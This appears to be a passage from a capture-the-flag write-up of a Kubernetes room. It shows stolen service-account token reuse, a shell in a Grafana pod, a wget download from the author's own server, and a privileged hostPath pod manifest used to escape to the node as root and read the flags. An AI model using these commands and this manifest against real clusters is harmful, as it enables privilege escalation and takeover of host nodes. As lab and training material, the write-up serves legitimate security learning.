challenge@syringe-79b66d66d7-7mxhd:/tmp$ ./kubectl get serviceaccount --token=eyJhbGciOiJSUzI1NiIsImtpZCI6Im82QU1WNV9qNEIwYlV3YnBGb1NXQ25UeUtmVzNZZXZQZjhPZUtUb21jcjQifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNjc3NjA3OTAzLCJpYXQiOjE2NDYwNzE5MDMsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJncmFmYW5hLTU3NDU0Yzk1Y2ItdjRucmsiLCJ1aWQiOiJmMmJkMTczZS1iNjU3LTQyNTMtYTM2NC1lNzA5ZDczMWZhMTIifSwic2VydmljZWFjY291bnQiOnsibmFtZSI6ImRldmVsb3BlciIsInVpZCI6IjE5NjdmYzMwLTQxYjktNDJjZC1hZGI3LWZhYjZkYWUxNDhmNiJ9LCJ3YXJuYWZ0ZXIiOjE2NDYwNzU1MTB9LCJuYmYiOjE2NDYwNzE5MDMsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRldmVsb3BlciJ9.nddXlHiH68jofQOhTnj_uZDs5RRdeDAhfuMcz5eNwS_W-Xz0UZ9ayml5jq3CIqW7Mlja6PnyVn_wQ1ls4ovIBjDXx_P5oVrGydxqXTjiCT2VpH6EIDMBFTawGguQb4NPsdYOuzlEBOfzat_C5EoSNzvVu3_U3n4HYweZtJ87ErlNKRiuRGI16umI3yR2YRD7gdxV1OwNVG7BcQ6sb6Bh0hJKdpGRBFMH6uYp0Nmr8v7jCY5XATw_P0i9381sERMwyHlrpfuymXl9sxQW53b1OcjyKE6ywvy-hjkbPI2difM8Xqbs-cdhpzPMr3SmBNqf8KyQWNWTGuf5O3-pB8M3Rw
<bPI2difM8Xqbs-cdhpzPMr3SmBNqf8KyQWNWTGuf5O3-pB8M3Rw
NAME        SECRETS   AGE
default     1         52d
developer   1         52d
syringe     1         52d
```

Now for the shell

```bash
challenge@syringe-79b66d66d7-7mxhd:/tmp$ ./kubectl exec -it grafana-57454c95cb-v4nrk --token=eyJhbGciOiJSUzI1NiIsImtpZCI6Im82QU1WNV9qNEIwYlV3YnBGb1NXQ25UeUtmVzNZZXZQZjhPZUtUb21jcjQifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNjc3NjA3OTAzLCJpYXQiOjE2NDYwNzE5MDMsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJncmFmYW5hLTU3NDU0Yzk1Y2ItdjRucmsiLCJ1aWQiOiJmMmJkMTczZS1iNjU3LTQyNTMtYTM2NC1lNzA5ZDczMWZhMTIifSwic2VydmljZWFjY291bnQiOnsibmFtZSI6ImRldmVsb3BlciIsInVpZCI6IjE5NjdmYzMwLTQxYjktNDJjZC1hZGI3LWZhYjZkYWUxNDhmNiJ9LCJ3YXJuYWZ0ZXIiOjE2NDYwNzU1MTB9LCJuYmYiOjE2NDYwNzE5MDMsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRldmVsb3BlciJ9.nddXlHiH68jofQOhTnj_uZDs5RRdeDAhfuMcz5eNwS_W-Xz0UZ9ayml5jq3CIqW7Mlja6PnyVn_wQ1ls4ovIBjDXx_P5oVrGydxqXTjiCT2VpH6EIDMBFTawGguQb4NPsdYOuzlEBOfzat_C5EoSNzvVu3_U3n4HYweZtJ87ErlNKRiuRGI16umI3yR2YRD7gdxV1OwNVG7BcQ6sb6Bh0hJKdpGRBFMH6uYp0Nmr8v7jCY5XATw_P0i9381sERMwyHlrpfuymXl9sxQW53b1OcjyKE6ywvy-hjkbPI2difM8Xqbs-cdhpzPMr3SmBNqf8KyQWNWTGuf5O3-pB8M3Rw -- /bin/bash
<-cdhpzPMr3SmBNqf8KyQWNWTGuf5O3-pB8M3Rw -- /bin/bash
Unable to use a TTY - input is not a terminal or the right kind of file
id
uid=472(grafana) gid=0(root) groups=0(root)
```

That will do!

```bash
env
KUBERNETES_SERVICE_PORT_HTTPS=443
GRAFANA_SERVICE_HOST=10.108.133.228
KUBERNETES_SERVICE_PORT=443
HOSTNAME=grafana-57454c95cb-v4nrk
SYRINGE_PORT=tcp://10.99.16.179:3000
GRAFANA_PORT=tcp://10.108.133.228:3000
SYRINGE_SERVICE_HOST=10.99.16.179
SYRINGE_PORT_3000_TCP=tcp://10.99.16.179:3000
GRAFANA_PORT_3000_TCP=tcp://10.108.133.228:3000
PWD=/tmp
GF_PATHS_HOME=/usr/share/grafana
SYRINGE_PORT_3000_TCP_PROTO=tcp
HOME=/home/grafana
KUBERNETES_PORT_443_TCP=tcp://10.96.0.1:443
FLAG=flag{288232b2f03b1ec422c5dae50f14061f}
SHLVL=1
SYRINGE_PORT_3000_TCP_PORT=3000
GF_PATHS_PROVISIONING=/etc/grafana/provisioning
GRAFANA_PORT_3000_TCP_PORT=3000
KUBERNETES_PORT_443_TCP_PROTO=tcp
KUBERNETES_PORT_443_TCP_ADDR=10.96.0.1
GRAFANA_SERVICE_PORT=3000
SYRINGE_PORT_3000_TCP_ADDR=10.99.16.179
SYRINGE_SERVICE_PORT=3000
GF_PATHS_DATA=/var/lib/grafana
KUBERNETES_SERVICE_HOST=10.96.0.1
KUBERNETES_PORT=tcp://10.96.0.1:443
KUBERNETES_PORT_443_TCP_PORT=443
GF_PATHS_LOGS=/var/log/grafana
GRAFANA_PORT_3000_TCP_PROTO=tcp
PATH=/usr/share/grafana/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
GF_PATHS_PLUGINS=/var/lib/grafana/plugins
GRAFANA_PORT_3000_TCP_ADDR=10.108.133.228
GF_PATHS_CONFIG=/etc/grafana/grafana.ini
_=/usr/bin/env
OLDPWD=/usr/share/grafana
```

Now Escape to the node (sounds cool)
We gotta make our own pod. [kubernetes themselves]() tell you how
So you need a `.yml` file like this

```bash
apiVersion: v1
kind: Pod
metadata:
    name: everything-allowed-pod
    labels:
        app: pentest
spec:
    hostNetwork: true
    hostPID: true
    hostIPC: true
    containers:
     - name: everything-allowed-pod
       image: ubuntu
       imagePullPolicy: IfNotPresent
       securityContext:
        privileged: true
       volumeMounts:
        - mountPath: /host
          name: noderoot
       command: [ "/bin/sh", "-c", "--" ]
       args: [ "while true; do sleep 30; done;" ]
    #nodeName: k8s-control-plane-node # Force your pod to run on the control-plane node by uncommenting this line and changing to a control-plane node name
    volumes:
     - name: noderoot
       hostPath:
        path: /

```
Make sure your file is well-formatted! I usually use a validator like [this one](https://jsonformatter.org/yaml-formatter)

You can put all this in a 'privesc.yml' file (or anything) and upload it with a python server + wget

```bash
challenge@syringe-79b66d66d7-7mxhd:/tmp$ wget http://10.8.226.203:8000/privesc.yml
<xhd:/tmp$ wget http://10.8.226.203:8000/privesc.yml
--2022-02-28 19:30:12--  http://10.8.226.203:8000/privesc.yml
Connecting to 10.8.226.203:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 556 [application/octet-stream]
Saving to: 'privesc.yml'

     0K                                                       100%  115K=0.005s

2022-02-28 19:30:12 (115 KB/s) - 'privesc.yml' saved [556/556]

challenge@syringe-79b66d66d7-7mxhd:/tmp$ ls
ls
kubectl
privesc.yml
```
Now make the pod

```bash
challenge@syringe-79b66d66d7-7mxhd:/tmp$ ./kubectl apply -f privesc.yml --token=eyJhbGciOiJSUzI1NiIsImtpZCI6Im82QU1WNV9qNEIwYlV3YnBGb1NXQ25UeUtmVzNZZXZQZjhPZUtUb21jcjQifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNjc3NjA3OTAzLCJpYXQiOjE2NDYwNzE5MDMsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJncmFmYW5hLTU3NDU0Yzk1Y2ItdjRucmsiLCJ1aWQiOiJmMmJkMTczZS1iNjU3LTQyNTMtYTM2NC1lNzA5ZDczMWZhMTIifSwic2VydmljZWFjY291bnQiOnsibmFtZSI6ImRldmVsb3BlciIsInVpZCI6IjE5NjdmYzMwLTQxYjktNDJjZC1hZGI3LWZhYjZkYWUxNDhmNiJ9LCJ3YXJuYWZ0ZXIiOjE2NDYwNzU1MTB9LCJuYmYiOjE2NDYwNzE5MDMsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRldmVsb3BlciJ9.nddXlHiH68jofQOhTnj_uZDs5RRdeDAhfuMcz5eNwS_W-Xz0UZ9ayml5jq3CIqW7Mlja6PnyVn_wQ1ls4ovIBjDXx_P5oVrGydxqXTjiCT2VpH6EIDMBFTawGguQb4NPsdYOuzlEBOfzat_C5EoSNzvVu3_U3n4HYweZtJ87ErlNKRiuRGI16umI3yR2YRD7gdxV1OwNVG7BcQ6sb6Bh0hJKdpGRBFMH6uYp0Nmr8v7jCY5XATw_P0i9381sERMwyHlrpfuymXl9sxQW53b1OcjyKE6ywvy-hjkbPI2difM8Xqbs-cdhpzPMr3SmBNqf8KyQWNWTGuf5O3-pB8M3Rw
<bPI2difM8Xqbs-cdhpzPMr3SmBNqf8KyQWNWTGuf5O3-pB8M3Rw
pod/everything-allowed-pod created
```
Check it's presence

```bash
challenge@syringe-79b66d66d7-7mxhd:/tmp$ ./kubectl get pods --token=eyJhbGciOiJSUzI1NiIsImtpZCI6Im82QU1WNV9qNEIwYlV3YnBGb1NXQ25UeUtmVzNZZXZQZjhPZUtUb21jcjQifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNjc3NjA3OTAzLCJpYXQiOjE2NDYwNzE5MDMsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJncmFmYW5hLTU3NDU0Yzk1Y2ItdjRucmsiLCJ1aWQiOiJmMmJkMTczZS1iNjU3LTQyNTMtYTM2NC1lNzA5ZDczMWZhMTIifSwic2VydmljZWFjY291bnQiOnsibmFtZSI6ImRldmVsb3BlciIsInVpZCI6IjE5NjdmYzMwLTQxYjktNDJjZC1hZGI3LWZhYjZkYWUxNDhmNiJ9LCJ3YXJuYWZ0ZXIiOjE2NDYwNzU1MTB9LCJuYmYiOjE2NDYwNzE5MDMsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRldmVsb3BlciJ9.nddXlHiH68jofQOhTnj_uZDs5RRdeDAhfuMcz5eNwS_W-Xz0UZ9ayml5jq3CIqW7Mlja6PnyVn_wQ1ls4ovIBjDXx_P5oVrGydxqXTjiCT2VpH6EIDMBFTawGguQb4NPsdYOuzlEBOfzat_C5EoSNzvVu3_U3n4HYweZtJ87ErlNKRiuRGI16umI3yR2YRD7gdxV1OwNVG7BcQ6sb6Bh0hJKdpGRBFMH6uYp0Nmr8v7jCY5XATw_P0i9381sERMwyHlrpfuymXl9sxQW53b1OcjyKE6ywvy-hjkbPI2difM8Xqbs-cdhpzPMr3SmBNqf8KyQWNWTGuf5O3-pB8M3Rw
<bPI2difM8Xqbs-cdhpzPMr3SmBNqf8KyQWNWTGuf5O3-pB8M3Rw
NAME                          READY   STATUS             RESTARTS       AGE
everything-allowed-exec-pod   0/1     ImagePullBackOff   0              96s
grafana-57454c95cb-v4nrk      1/1     Running            10 (28d ago)   52d
syringe-79b66d66d7-7mxhd      1/1     Running            1 (28d ago)    28d
```
Get a shell inside

```bash
challenge@syringe-79b66d66d7-7mxhd:/tmp$ ./kubectl exec -it everything-allowed-pod --token=eyJhbGciOiJSUzI1NiIsImtpZCI6Im82QU1WNV9qNEIwYlV3YnBGb1NXQ25UeUtmVzNZZXZQZjhPZUtUb21jcjQifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNjc3NjA3OTAzLCJpYXQiOjE2NDYwNzE5MDMsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJncmFmYW5hLTU3NDU0Yzk1Y2ItdjRucmsiLCJ1aWQiOiJmMmJkMTczZS1iNjU3LTQyNTMtYTM2NC1lNzA5ZDczMWZhMTIifSwic2VydmljZWFjY291bnQiOnsibmFtZSI6ImRldmVsb3BlciIsInVpZCI6IjE5NjdmYzMwLTQxYjktNDJjZC1hZGI3LWZhYjZkYWUxNDhmNiJ9LCJ3YXJuYWZ0ZXIiOjE2NDYwNzU1MTB9LCJuYmYiOjE2NDYwNzE5MDMsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRldmVsb3BlciJ9.nddXlHiH68jofQOhTnj_uZDs5RRdeDAhfuMcz5eNwS_W-Xz0UZ9ayml5jq3CIqW7Mlja6PnyVn_wQ1ls4ovIBjDXx_P5oVrGydxqXTjiCT2VpH6EIDMBFTawGguQb4NPsdYOuzlEBOfzat_C5EoSNzvVu3_U3n4HYweZtJ87ErlNKRiuRGI16umI3yR2YRD7gdxV1OwNVG7BcQ6sb6Bh0hJKdpGRBFMH6uYp0Nmr8v7jCY5XATw_P0i9381sERMwyHlrpfuymXl9sxQW53b1OcjyKE6ywvy-hjkbPI2difM8Xqbs-cdhpzPMr3SmBNqf8KyQWNWTGuf5O3-pB8M3Rw -- /bin/bash
<-cdhpzPMr3SmBNqf8KyQWNWTGuf5O3-pB8M3Rw -- /bin/bash
Unable to use a TTY - input is not a terminal or the right kind of file
id
uid=0(root) gid=0(root) groups=0(root)
```
Now flag! Remember the mounting point is `host`

```bash
cd host
/bin/bash: line 6: cd: host: No such file or directory
cd /host
ls
Release.key
bin
boot
data
dev
docker.key
etc
home
kic.txt
kind
lib
lib32
lib64
libx32
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
```
Now go in `/host/root`

```bash
cd root
ls
root.txt
cat root.txt
flag{kuber_root_flag_for_kubernetes_pros}
```
Awesome room!

